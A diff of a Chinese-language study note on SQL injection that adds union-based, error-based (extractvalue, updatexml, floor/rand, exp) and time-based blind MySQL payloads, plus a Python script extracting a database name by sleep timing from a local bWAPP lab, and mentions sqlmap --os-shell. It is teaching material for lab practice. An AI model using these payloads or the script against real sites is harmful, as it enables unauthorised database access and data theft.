@@ -2,7 +2,7 @@
 title: "Sql Inject"
 draft: true
 sidebar: false
-outline: 2
+outline: deep
 ---
 
 # Sql Inject
@@ -60,22 +60,22 @@ SQL注入漏洞主要形成的原因是在数据交互中，前端的数据传�
 1' and '1'='1
 ```
 ```sql
-1' and 1=1 --+
+1' and 1=1 #
 ```
 **判断查询字段数目**
 
 ```sql
-1' order by 3 --+
+1' order by 3 #
 ```
 
 **确定回显字段**
 
 ```sql
-1' union select 1,2,3 limit 1,1 --+
+1' union select 1,2,3 limit 1,1 #
 ```
 
 ```sql
-' union select 1,2,3 --+
+' union select 1,2,3 #
 ```
 ## union注入
 
@@ -84,6 +84,11 @@ SQL注入漏洞主要形成的原因是在数据交互中，前端的数据传�
 - 所有查询中的**列数必须相同**，以第一个查询为准。
 
 [information_schema元数据库](../cyber/WebApplication.md#information-schema)
+
+*查询当前操作数据库对应的信息*
+```sql
+1' union select 1,user(),database(),version(),group_concat(table_name),6,7 from information_schema.tables where table_schema = database() #
+```
 
 *查询数据库*
 ```sql
@@ -231,5 +236,173 @@ sqlmap -r "post.txt" -p "id"
 ```bash
 sqlmap -r "post.txt" --os-shell
 ```
+---
+
+## In-Band
+
+[In-Band SQLi](../security/webpentesting.md#in-band-sqli)
+
+### Error-Based
+
+MySQL 的报错注入主要是利用 MySQL 的一些逻辑漏洞，如 BigInt 大数溢出等，由此可以将 MySQL 报错注入主要分为以下几类：
+
+1. BigInt 等数据类型溢出
+2. XPath 语法错误
+3. `count()` + `rand()` + `group_by()` 导致重复
+4. 空洞数据类型函数错误
+
+很多函数会导致 MySQL 报错并显示数据：
+
+1. `floor` 函数；
+2. `extractvalue` 函数；(最多32字符)
+3. `updatxml` 函数；
+4. `exp()` 函数；
+
+<span style="font-size: 19px;">**floor、rand(0)和group by**</span>
+
+<img src="./assets/sqli_erro_based_rand_group.png" alt="background" width="533" >
+
+```sql
+select count(*),concat((select user()), floor(rand(0)*2)) x from information_schema.TABLES group by x
+```
+
+<span style="font-size: 19px;">**extractvalue**</span>
+
+```sql
+select extractvalue(1, concat(0x7e, (select @@version)));
+```
+*payload*
+```bash
+?id=1' and extractvalue(1, concat(0x7e, (select @@version))) -- '
+```
+- `0x7e` 代表` ~`：`concat(0x7e, (select @@version))` 会将波浪号 `~` 和数据库版本信息连接在一起（例如：`~5.7.26`）。
+- `extractvalue()` 函数的作用是从 XML 中提取数据，它的第二个参数必须是符合 **XPath** 语法格式的路径。
+- **制造非法路径**：由于路径以波浪号 `~` 开头，不符合 **XPath** 的语法规范，数据库会因为**语法错误**而抛出异常。
+- **获取敏感信息**：数据库在报错时，会将这个不合法的路径（连同我们拼接进去的 `@@version` 版本信息）直接显示在错误信息中。例如：`1105 - XPATH syntax error: '~5.7.26'`
+
+<span style="font-size: 19px;">**updatxml**</span>
+
+```sql
+select updatexml(1,concat(0x7e,(SELECT @@version)),1);
+```
+`1105 - XPATH syntax error: '~5.7.26'`
+
+*payload*
+```bash
+?id=2' and updatexml(1,concat(0x7e,(SELECT @@version)),1) -- '
+```
 
 
+- `updatexml(xml_target, xpath_expression, new_xml)` 这是一个 **MySQL** 用于修改 **XML** 数据的内置函数。它接收三个参数：
+  - `xml_target`：目标 **XML** 内容或文档。
+  - `xpath_expression`：用于定位要修改的 **XML** 节点的 **XPath** 路径。
+  - `new_xml`：替换后的新 **XML** 内容。
+
+<span style="font-size: 19px;">**exp()**</span>
+
+```sql
+select exp(~(select * from (select database())x));
+```
+`DOUBLE value is out of range in ...`
+
+
+**`exp()` 双精度溢出报错**
+
+* **`exp(x)` 函数**：该函数用于计算自然对数底数 $e$ 的 $x$ 次方（即 $e^x$）。
+* **溢出条件**：在计算机中，双精度浮点数能表示的最大值是有限的。在 MySQL 中，当 `exp()` 的参数 $x$ 大于约 `709.78` 时，计算结果就会超出双精度浮点数的最大范围，从而触发 **"Double value out of range"（双精度数值超出范围）** 的溢出错误。
+* **信息回显**：在 **MySQL 5.5.x** 等较早版本中，当 `exp()` 发生溢出报错时，数据库会将导致溢出的查询结果作为错误信息的一部分返回给客户端。
+
+
+---
+
+## Blind
+
+[Blind SQLi](../security/webpentesting.md#inferential-blind-sqli)
+
+### Time-Based
+
+<span style="font-size: 19px;">**时间盲注常用函数**</span>
+
+<img src="./assets/时间盲注常用函数.png" alt="background" width="433" >
+
+**靶场bWAPP: SQL Injection - Blind - Time-Based**
+```javascript
+# 慢(true)
+World War Z' and length(database())>3 and sleep(2) --  
+
+# 快(false)
+World War Z' and length(database())>5 and sleep(2) --  
+
+# 慢(true)
+World War Z' and length(database())>4 and sleep(2) --  
+
+# 慢(true)
+World War Z' and length(database())=5 and sleep(2) -- 
+```
+
+```javascript
+# 快(false)
+World War Z' and substr(database(),1,1)='a' and sleep(2) -- 
+
+# 慢(true) 说明第一个字符是b
+World War Z' and substr(database(),1,1)='b' and sleep(2) -- 
+World War Z' and ascii(substr(database(),1,1))=98 and sleep(2) -- 
+...
+# 慢(true) 说明前两个字符是bW
+World War Z' and substr(database(),1,2)='bW' and sleep(2) -- 
+World War Z' and ascii(substr(database(),2,1))=87 and sleep(2) -- 
+...
+```
+
+<span style="font-size: 19px;">**时间盲注 自动化代码**</span>
+
+```python
+#!/usr/bin/python
+#coding:utf-8
+
+import requests
+import time
+
+#ip地址和登录payload
+ip_port='127.0.0.1:80'
+data={
+    "login":"fairy",
+    "password":"123qwe",
+    "security_level":"0",
+    "form":"submit"
+}
+#通过requests库 构建会话并维持登录状态
+urlLogin="http://%s/login.php"%ip_port
+session=requests.session()
+resp=session.post(urlLogin, data)
+
+#获取数据库名称长度
+num=0
+for i in range(1,21):
+    url="http://%s/sqli_15.php?title=World War Z' and length(database())=%d and sleep(2) -- &action=search"%(ip_port, i)
+    startTime = time.time()
+    rsp = session.get(url)
+    endTime = time.time()
+    ga = endTime - startTime
+    if ga > 1:
+        print("length of database name is %d"%i)
+        print("startTime", startTime)
+        print("endTime", endTime)
+        num = i
+        break
+
+#获取数据库名字
+l = []
+for j in range(1, num+1):
+    for k in range(33, 128):
+        url="http://%s/sqli_15.php?title=World War Z' and ascii(substr(database(),%d,1))=%d and sleep(2) -- &action=search"%(ip_port, j, k)
+        startTime = time.time()
+        rsp = session.get(url)
+        endTime = time.time()
+        ga = endTime - startTime
+        if ga > 1:
+            print(f'第{j}个字符：{chr(k)}')
+            l.append(chr(k))
+            break
+print("name of database is ", ''.join(l))
+```
